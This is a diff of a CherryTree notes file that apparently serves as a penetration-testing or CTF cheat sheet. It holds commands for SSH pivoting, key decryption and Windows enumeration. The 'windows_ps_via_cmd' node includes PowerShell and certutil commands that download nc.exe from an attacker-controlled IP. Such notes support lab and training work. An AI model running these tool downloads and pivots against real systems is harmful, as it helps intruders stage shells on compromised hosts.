@@ -1080,7 +1080,7 @@ nmap --script-updatedb</rich_text>
       </node>
     </node>
   </node>
-  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1663520409">
+  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1664288663">
     <rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
     <rich_text>
 </rich_text>
@@ -1857,15 +1857,27 @@ exit</rich_text>
     <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1656313486">
       <rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 </rich_text>
     </node>
-    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663605170">
+    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663605176">
       <rich_text>powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2/nc.exe', 'c:\Users\Public\Downloads\nc.exe')"
 
 download
 certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
 
-</rich_text>
+tasklist
+enum all tasks
+
+netstat -ano
+check all open network interface</rich_text>
     </node>
+  </node>
+  <node name="decrypt_key_ssh" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664288663" ts_lastsave="1664290655">
+    <rich_text>openssl rsa -in hype_key_encrypted -out hype_key_decrypted
+</rich_text>
+  </node>
+  <node name="fix_ssh_key" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664290655" ts_lastsave="1664290655">
+    <rich_text family="monospace">-o </rich_text>
+    <rich_text family="monospace" scale="h3" foreground="#669900">'PubkeyAcceptedKeyTypes +ssh-rsa'</rich_text>
   </node>
   <node name="obfuscate_deobfuscate" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656818398" ts_lastsave="1656836768">
     <rich_text>de4jse</rich_text>
